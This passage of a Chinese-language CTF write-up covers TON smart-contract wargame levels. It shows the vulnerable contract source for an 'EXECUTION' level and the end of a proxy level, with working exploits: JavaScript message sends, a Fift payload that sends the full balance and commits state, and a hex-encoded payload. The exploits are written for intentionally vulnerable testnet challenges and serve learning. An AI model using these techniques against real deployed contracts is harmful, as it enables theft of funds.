    // get methods are a means to conveniently read contract data using, for example, HTTP APIs
    // note that unlike in many other smart contract VMs, get methods cannot be called by other contracts

    get owner(): slice {
        loadData();
        return ctxOwner;
    }

    get enabled(): bool {
        loadData();
        return ctxEnabled;
    }
    ```

- 题目要求将 `ctxEnabled` 设置为 `false`，但只有合约所有者能够设置，而所有者为零地址

    ```js
    > (await contract.getOwner()).toString();
    EQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAM9c
    ```

- 在 `ctxEnabled` 为 `true` 时，操作 `0` 可以向任意地址发送任意消息，可以用于直接发送 `check` 消息
- 可以先执行一次 `CHECK SOLUTION`，以确定[目标地址](https://testnet.tonviewer.com/kQDL370ftqHMY7NcopQb2H9fs7AjkqepO9nPtJXdLSmx6Bvw)
- 发送 `check` 消息

    ```js
    > await contract.send(player, beginCell().storeUint(0, 32).storeAddress(Address.parse("kQDL370ftqHMY7NcopQb2H9fs7AjkqepO9nPtJXdLSmx6Bvw")).storeRef(beginCell().storeUint(0x6df37b4d, 32).storeRef(beginCell().storeStringTail("proxy").endCell()).storeUint(1, 1).endCell()).endCell(), toNano("0.05"));
    ```

- 另外，由于 `onInternalMessage()` 没有检查收到的消息是否是弹回消息，也可以向零地址发送消息，并借助弹回消息设置 `ctxEnabled`

    ```js
    > await contract.send(player, beginCell().storeUint(0, 32).storeAddress(await contract.getOwner()).storeRef(beginCell().storeUint(1, 32).endCell()).endCell(), toNano("0.05"));
    ```

### References

- [Transfer With a Comment](https://docs.ton.org/v3/guidelines/ton-connect/guidelines/preparing-messages#transfer-with-a-comment)

## 20. EXECUTION

> You will beat this level if you manage to reduce its balance to 0.

??? note "Execution"

    ```
    import "@stdlib/tvm-lowlevel"

    // storage variables

    global ctxPlayer: slice;
    global ctxNonce: int;

    // loadData populates storage variables using stored data
    fun loadData() {
        var ds = getContractData().beginParse();

        ctxPlayer = ds.loadAddress();
        ctxNonce = ds.loadUint(32);

        ds.assertEndOfSlice();
    }

    // saveData stores storage variables as a cell into persistent storage
    fun saveData() {
        setContractData(
            beginCell()
                .storeSlice(ctxPlayer)
                .storeUint(ctxNonce, 32)
            .endCell()
        );
    }

    // this asm actually do nothing on TVM level, but force compiler to think that 
    // typeless continuation is actually () to int function
    @pure
    fun castToFunction(c: continuation): (() -> int)
        asm "NOP";

    // put cell to c5 (we need it to clean register)
    fun setC5(c: cell): void
        asm "c5 POPCTR";

    // this asm gets function as an argument
    // then it passes it to "wrapper" and execute wrapper with "1 1 CALLXARGS"
    // that means move to wrapper stack 1 element and then return 1 element.
    // wrapper itself try to execute function but catches exceptions, also it checks that
    // after execution there is at least 1 element on stack via `DEPTH 2 THROWIFNOT`.
    // if function didn't throw, wrapper returns it's result, otherwise it returns NULL from CATCH statement
    @pure
    fun tryExecute(guesser: (() -> int)): int
        asm "<{ TRY:<{ EXECUTE DEPTH 2 THROWIFNOT }>CATCH<{ 2DROP NULL }> }>CONT" "1 1 CALLXARGS";

    // we do not trust function which we test: it may try to send messages or do other nasty things
    // so we wrap it to the function which save register values prior to execution
    // and restores them after
    @inline
    fun safeExecute(guesser: (() -> int)): int {
        val c4: cell = getContractData();
        val result: int = tryExecute(guesser);
        // restore c4 if guesser spoiled it
        setContractData(c4); 
        // clean actions if guesser spoiled them
        setC5(beginCell().endCell());
        return result;
    }

    // onInternalMessage is the main function of the contract and is called when it receives a message from other contracts
    fun onInternalMessage(myBalance: int, msgValue: int, inMsgFull: cell, inMsgBody: slice) {
        if (inMsgBody.isEndOfSlice()) { // ignore all empty messages
            return;
        }

        var cs: slice = inMsgFull.beginParse();
        val flags: int = cs.loadUint(4);
        if (flags & 1) { // ignore all bounced messages
            return;
        }
        val senderAddress: slice = cs.loadAddress();

        loadData(); // here we populate the storage variables

        val op: int = inMsgBody.loadUint(32); // by convention, the first 32 bits of incoming message is the op

        // receive "check" message
        if (isSliceBitsEqual(inMsgBody, "check")) {
            // send CheckLevelResult msg
            val msgBody: cell = beginCell()
                .storeUint(0x6df37b4d, 32)
                .storeRef(beginCell().storeSlice("execution").endCell())
                .storeBool(myBalance - msgValue == 0)
            .endCell();
            val msg: builder = beginCell()
                .storeUint(0x18, 6)
                .storeSlice(senderAddress)
                .storeCoins(0)
                .storeUint(1, 1 + 4 + 4 + 64 + 32 + 1 + 1)
                .storeRef(msgBody);
                
            // send all the remaining value
            sendRawMessage(msg.endCell(), 64);
            return;
        }

        if (op == 0) {
            val code: cell = inMsgBody.loadRef();
            val guesser = castToFunction(code.beginParse().transformSliceToContinuation());
            randomizeByLogicalTime();
            val randomNumber: int = random();
            val guess: int = safeExecute(guesser);
            assert(randomNumber == guess, 501);

            val msg = beginCell()
                .storeUint(0x18, 6)
                .storeSlice(senderAddress)
                .storeCoins(0)
                .storeUint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)
            .endCell();

            // send all the contract balance
            sendRawMessage(msg, 128);
            return;
        }

        throw 0xffff; // if the message contains an op that is not known to this contract, we throw
    }

    get balance(): int {
        val [value, _] = getMyOriginalBalanceWithExtraCurrencies();
        return value;
    }
    ```

- 通过操作 `0` 中的检查即能清空合约所持有的 TON
- 操作 `0` 能够将发送者提供的代码作为无输入返回值类型为 `int` 的函数执行，且要满足返回值与 `randomNumber` 相同
- 但是操作 `0` 已经调用一次 `randomizeByLogicalTime()` 随机化了种子，因而无法通过执行相同的代码来获取相同的随机数。不过，尽管 `safeExecute()` 在调用完 `tryExecute()` 后会重置寄存器 `c4` 和 `c5`，但由于没有 `commit`，后续执行如果抛出错误，修改将会被回滚。因此，用户自定义的 `guesser()` 函数实际上可以直接发送模式为 128 的消息，并调用 `commit()` 提交当前 `c4`、`c5` 寄存器的状态即可

    ```
    "Asm.fif" include
    "TonUtil.fif" include
    <{
        <b 0x18 6 u, "0QAHpxVbUO9IXraTMeTmqWNFenGg00qWDnTjhyR0HdsnsCrL" $>smca 2drop Addr, 0 Gram, 0 107 u, b>  // 构建消息体
        PUSHREF
        128 PUSHINT
        SENDRAWMSG
        COMMIT
        1 PUSHINT   // 作为返回值
    }>s s>c boc>B Bx.   // 输出结果
    ```

- 编译代码

    ```bash
    $ fift func.fif -I libs/
    ```

- 发送交易

    ```js
    > await contract.send(player, beginCell().storeUint(0, 32).storeRef(Cell.fromHex("B5EE9C7201010201003E00011288810080FB00F80F71010060620003D38AADA877A42F5B4998F27354B1A2BD38D069A54B073A71C3923A0EED93D80000000000000000000000000000")).endCell(), toNano("0.05"));
    ```

### References

- [`bless`](https://docs.ton.org/v3/documentation/smart-contracts/func/docs/stdlib/#bless)
- [Introduction To Fift](https://blog.ton.org/introduction-to-fift)
- [Fift deep dive](https://docs.ton.org/v3/documentation/smart-contracts/fift/fift-deep-dive#defining-functions-fift-words)
- [Fift: A Brief Introduction](https://ton.org/fiftbase.pdf)
- [Telegram Open Network Virtual Machine](https://ton.org/tvm.pdf)
